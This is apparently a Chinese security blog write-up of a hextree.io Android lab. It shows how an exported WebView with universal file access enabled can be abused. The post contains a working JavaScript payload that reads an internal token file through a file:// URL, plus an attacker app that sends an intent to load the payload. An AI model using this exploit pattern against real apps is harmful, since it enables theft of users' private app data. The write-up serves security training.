> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI0MTUwMjQ5Nw==&mid=2247489256&idx=1&sn=503b05e22ac55c8acc087c2ad80efcba

#  利用 WebView 漏洞：绕过 SOP 访问内部应用程序文件  
原创 红云谈安全  红云谈安全   2025-06-25 11:50  
  
**免责声明**  
  
由于传播、利用本公众号红云谈安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号红云谈安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！  
如有侵权烦请告知，我们会立即删除并致歉。谢谢！请在授权的站点测试，遵守网络安全法！  
**仅供**  
**学习使用，****如若非法他用，与平台和本文作者无关，需自行负责！**  
  
  
你有没有想过能够窃取 Android 应用程序的内部文件，例如  

```
.db
```

  
文件或其他敏感数据？在本文中，我将通过解决  
hextree.io  
的一个实验来指导你如何做到这一点。  
# 初步分析  
  
**首先，我在Android Studio 模拟器**  
上安装了目标应用程序，并使用  
**JADX**  
对其进行反编译，以分析其  

```
AndroidManifest.xml
```

  
文件。我很快注意到一个  
**WebView 活动**  
被标记为  

```
exported=&#34;true&#34;
```

  
  
  
为了进一步调查，我检查了活动的  
**onCreate()**  
方法。  
  
# 分解 onCreate() 方法  
1. 应用程序使用 检索额外的字符串值 (   

```
URL
```

  
)   

```
getIntent()
```

  
。  
  
1. 如果值为  

```
null
```

  
，则默认为加载  

```
https://www.hextree.io
```

  
。  
  
1. 然后，它使用以下内容配置 WebView 设置：  
  

```
设置.setJavaScriptEnabled( true );
设置.setAllowFileAccessFromFileURLs( true );
设置.setAllowFileAccess( true );
设置.setAllowUniversalAccessFromFileURLs( true );
```

  
这些设置  
**非常危险**  
，尤其是：  
- 
```
setAllowUniversalAccessFromFileURLs(true)
```

  
，允许 WebView 从多个来源加载文件，包括  

```
https://
```

  
、、  

```
content://
```

  
和  

```
file://
```

  
……等  
  
- 这可能使攻击者能够通过恶意 HTML 页面读取本地文件，或获得  
**RCE。**  
  
\4. 应用程序生成一个随机  
**UUID**  
并将其写入名为 的文件中  

```
token.txt
```

  
。  
  
\5. 它注册一个名为的  
**JavaScript 接口**  

```
&#34;hextree&#34;
```

  
，并将其映射到一个  

```
JsObject
```

  
类。  
  
\6. 最后，它加载提供的  

```
URL
```

  
。  
# 检查 JavaScript 接口  
  
  
该类  

```
JsObject
```

  
包含一个  

```
authCallback()
```

  
函数：  
- 接受一个  
**标记**  
作为参数。  
  
- 读取  

```
token.txt
```

  
文件并比较其值。  
  
- 如果令牌匹配，它将触发该  

```
success()
```

  
方法（这是我们的目标）。  
  
- 否则，它什么也不做。  
  
# 漏洞利用  
  
由于该应用程序允许通用文件访问并提供了 JavaScript 接口，我们可以通过加载带有  
**恶意 JavaScript 负载的**  
外部 URL 来利用它。  
## 1. JavaScript 有效载荷  
  
以下脚本将从函数中窃取令牌  

```
token.txt
```

  
并将其传递给  

```
authCallback()
```

  
函数：  

```
< script > 
  onload = () => { 
    let x = new XMLHttpRequest(); 
    x.onload = () => hextree.authCallback(x.responseText.trim()); 
    x.open(&#34;GET&#34;, &#34;file:///data/data/io.hextree.attacksurface/files/token.txt&#34;); 
    x.send(); 
  }; 
</ script >
```

## 解释：  
- 
```
onload
```

  
该脚本在页面加载（事件）时执行。  
  
- 它发出  
**XHR 请求**  
来检索的内容  

```
token.txt
```

  
。  
  
- 一旦加载，它  
**会修剪**  
响应并将其发送到  

```
authCallback()
```

  
，从而触发成功条件。  
  
将此有效载荷保存为  

```
exploit.html
```

  
应用程序的内部存储：file:///data/data/io.hextree.attacksurface/files/exploit.html  
# 2. 部署攻击  
  
为了启动漏洞利用，我们需要创建一个  
**攻击应用程序**  
，向易受攻击的 WebView 活动发送意图，指示它加载我们的恶意 HTML 文件。  
## 漏洞利用应用程序代码：  

```
    @Override 
    protected  void  onCreate (Bundle savedInstanceState) { 
        super .onCreate (savedInstanceState); 

        Intent  intent  =  new  Intent (); 
        intent.setClassName( &#34;io.hextree.attacksurface&#34; , 
                &#34;io.hextree.attacksurface.webviews.Flag40WebViewsActivity&#34; ); 
        StringexploitUrl  = &#34;file:///data/data/io.hextree.attacksurface/files/exploit.html&#34; ;         intent.putExtra( &#34;URL&#34; ,exploitUrl);         startActivity(intent);     }  
```

## 工作原理：  
1. 该应用程序通过指定其包和类名  
**来定位易受攻击的 WebView 活动。**  
  
1. 它设置为我们的  
**恶意 HTML 负载**  

```
exploitUrl
```

  
的路径。  
  
1. 它将这个 URL 作为额外的字符串（ ）  
**传递**  

```
URL
```

  
并启动活动。  
  
一旦漏洞应用程序启动，易受攻击的 WebView 就会加载我们的有效负载，读取  

```
token.txt
```

  
，并成功触发  

```
authCallback()
```

  
，从而授予我们访问  
**标志**  
的权限。  
  
  
这表明 Android 应用程序存在严重的  
**WebView 漏洞**  
，并展示了如何利用不安全的设置来窃取内部文件。  
  
  
  
  
